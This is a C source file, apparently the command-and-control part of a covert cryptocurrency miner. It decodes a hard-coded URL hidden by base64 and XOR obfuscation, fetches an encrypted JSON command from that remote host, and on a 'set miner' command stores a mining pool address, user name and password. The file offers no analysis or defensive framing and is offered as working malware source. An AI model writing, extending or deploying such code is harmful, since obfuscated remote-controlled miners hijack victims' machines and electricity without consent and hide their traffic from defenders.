#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <jansson.h>
#include "urlopen.h"
#include "base64.h"
#include "main.h"

struct node g_node = {NULL, NULL, NULL};

DEBUG_LEVEL_E debug_level = E_INFO;
static bool decode(char *in, char **out, char *salt)
{
    if(in==NULL || out==NULL || salt==NULL)
        return 0;

    char buff[strlen(in)];
    memset(buff, 0, sizeof(buff));

    uint32_t in_len = base64_decode(in, buff);

    *out = malloc(in_len);
    if(*out == NULL)
        return false;

    memset(*out, 0, in_len);

    uint32_t i=0, j=0;
    uint32_t salt_len = strlen(salt);

    for(i=0,j=0; i<in_len; i++,j++)
    {
       if(j%salt_len == 0)
           j = 0;
       (*out)[i] = buff[i] ^ salt[j]*_SL;
    }

    return true;
}

static bool resp2str(char *encodeurl, char **out, uint32_t *out_len)
{
    if(encodeurl==NULL || out==NULL)
        return false;

    char *resp = NULL;
    uint32_t len = decode(encodeurl, &resp, SALTSTR);
    log_msg(E_DEBUG, "buff url:%s", resp);

    bool ret = url_get(resp, out, out_len);
    if(resp)
        free(resp);
    return ret;
}

static void print_node(struct node *n)
{
    if(n == NULL)
        return;

    log_msg(E_INFO, "n->url:%s", n->url);
    log_msg(E_INFO, "n->user:%s", n->user);
    log_msg(E_INFO, "n->passwd:%s", n->passwd);
}

static void free_node(struct node *n)
{
    if(n == NULL)
        return;

    if(n->url)
        free(n->url);
    if(n->user)
        free(n->user);
    if(n->passwd)
        free(n->passwd);
}

static bool set_miner(json_t *params_t)
{
    json_t *url_t    = json_array_get(params_t, 0);
    json_t *user_t   = json_array_get(params_t, 1);
    json_t *passwd_t = json_array_get(params_t, 2);

    if(url_t==NULL || user_t==NULL || passwd_t==NULL)
        return false;

    free_node(&g_node);

    g_node.url    = strdup(json_string_value(url_t));
    g_node.user   = strdup(json_string_value(user_t));
    g_node.passwd = strdup(json_string_value(passwd_t));

    return true;
}

#define RPCURL "DY9uL4g76wHvdDaoKZydZwsHjmk6iWKrQOlwL/JgloZiURaUfCqVY6VM/Doz9i2WhWYbC481MppysEvvOiLpI5iIYRo="
int main(int argc, char *argv[])
{
    char *resp = NULL;

    resp2str(RPCURL, &resp, NULL);
    log_msg(E_DEBUG, "resp:%s", resp);

    char *jsonstr = NULL;
    decode(resp, &jsonstr, SALTSTR);
    log_msg(E_INFO, "jsonstr:%s", jsonstr);
    if(resp)
        free(resp);

    json_error_t jerror;
    json_t *root = json_loads(jsonstr, 0 ,&jerror);
    if(root == NULL)
    {
        log_msg(E_ERROR, "json load error:%s %d", jerror.text, jerror.line);
        goto _OUT;
    }

    json_t *cmd_t = json_object_get(root, "cmd");
    if(cmd_t == NULL)
        goto _DECREF_OUT;
    int cmd = json_integer_value(cmd_t);
    log_msg(E_INFO, "cmd:%d", cmd);

    json_t *params_t = json_object_get(root, "params");
    if(params_t == NULL)
        goto _DECREF_OUT;

    bool ret = false;
    switch(cmd)
    {
        case CMD_SET_MINER:
            ret = set_miner(params_t);
            break;
        default:
            log_msg(E_ERROR, "Unknow cmd:%d", cmd);
    }

    print_node(&g_node);

_DECREF_OUT:
    json_decref(root);

_OUT:
    if(jsonstr)
        free(jsonstr);

    return ret;
}

